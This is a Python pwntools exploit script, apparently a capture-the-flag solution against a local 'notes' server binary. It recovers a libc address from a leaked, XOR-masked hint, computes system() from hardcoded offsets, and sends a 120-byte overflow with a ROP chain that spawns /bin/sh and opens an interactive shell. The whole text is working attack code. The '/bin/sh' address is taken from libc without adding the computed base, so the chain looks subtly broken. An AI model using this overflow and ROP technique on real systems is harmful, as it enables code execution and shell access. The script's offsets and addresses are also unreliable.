from pwn import *

context.arch = 'amd64'

elf = ELF("./server/notes")
libc = ELF("/usr/lib/libc.so.6")

p = elf.process()

rop = ROP(elf)

hint = p.recvline().split(b':')[-1].decode()
hint = int(hint, 16)
xor = int(subprocess.check_output(["./solve/rng"]).decode().strip())

print("hint =", hint, " xor =", xor)
print("exit- address =", hex(hint ^ xor))

exit_address = hint ^ xor
exit_offset = 0x0000000000040df0
libc_base = exit_address - exit_offset
system_address = libc_base + 0x000000000004f760

rop.call(libc_base + 0x0000000000056250)
rop.call(system_address, [next(libc.search(b'/bin/sh\x00'))])

print(rop.dump())

payload = b'A' * 120 + rop.chain()

p.recvuntil(b":\n")
p.sendline(payload)

print(payload)

p.interactive()